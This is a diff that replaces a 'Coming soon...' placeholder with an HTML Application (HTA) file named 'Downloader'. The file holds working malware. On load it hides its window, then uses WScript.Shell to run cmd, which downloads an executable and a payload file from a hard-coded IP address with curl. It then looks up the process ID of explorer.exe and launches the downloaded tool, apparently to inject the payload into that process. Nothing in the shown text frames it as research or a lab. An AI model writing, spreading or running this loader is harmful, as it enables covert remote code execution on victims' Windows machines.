@@ -1,1 +1,29 @@
-Coming soon...
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="SI"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="normal"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+
+<script type="text/javascript">
+
+function executepayload() {
+	window.resizeTo(0,0);
+	blah= new ActiveXObject('Wscript.Shell');
+
+	blah.Run('cmd /c c:\\windows\\sysnative\\curl.exe -o c:\\windows\\temp\\ub2.exe http://54.211.143.194/ub.exe -A nginx & c:\\windows\\sysnative\\curl.exe -o c:\\windows\\temp\\payload2.bin http://54.211.143.194/payload2.bin -A nginx & for /f "tokens=2" %A in (\'tasklist ^| findstr /i "explorer.exe"\') do @Set "PID=%A" & c:\\windows\\temp\\ub2.exe -c -p c:\\windows\\temp\\payload2.bin -i %A', 0);
+
+}
+
+setTimeout(executepayload, 1000); 
+</script>
+
+</head>
+<body>
+</body>
+</html>
+
